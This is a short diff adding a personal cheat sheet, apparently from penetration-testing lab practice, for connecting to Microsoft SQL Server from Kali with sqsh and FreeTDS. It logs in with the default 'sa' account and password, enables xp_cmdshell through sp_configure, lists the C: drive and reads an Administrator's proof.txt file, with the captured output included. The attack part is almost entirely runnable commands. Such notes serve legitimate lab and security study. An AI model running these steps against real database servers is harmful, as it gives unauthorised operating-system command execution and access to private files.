@@ -1,0 +1,43 @@
+# to access ms-sql via kali
+
+apt-get install sqsh freetds-bin freetds-common freetds-dev
+Once done, we’ll need to edit /etc/freetds/freetds.conf, and append the following to it:
+
+[MyServer]
+host = 192.168.1.10
+port = 1433
+tds version = 8.0
+And lastly, we’ll edit ~/.sqshrc:
+
+\set username=sa
+\set password=password
+\set style=vert
+
+Finally by issuing:
+sqsh -S MyServer
+
+-- To allow advanced options to be changed.  
+EXEC sp_configure 'show advanced options', 1;  
+GO  
+-- To update the currently configured value for advanced options.  
+RECONFIGURE;  
+GO  
+-- To enable the feature.  
+EXEC sp_configure 'xp_cmdshell', 1;  
+GO  
+-- To update the currently configured value for this feature.  
+RECONFIGURE;  
+GO  
+
+xp_cmdshell 'dir c:'
+go
+
+> xp_cmdshell 'more "C:\Documents and Settings\Administrator\Desktop\proof.txt"'
+2> go
+output: 6badf43b508061b0e6fa88c9496ae751
+ 
+output: NULL
+ 
+(return status = 0)
+1> 
+
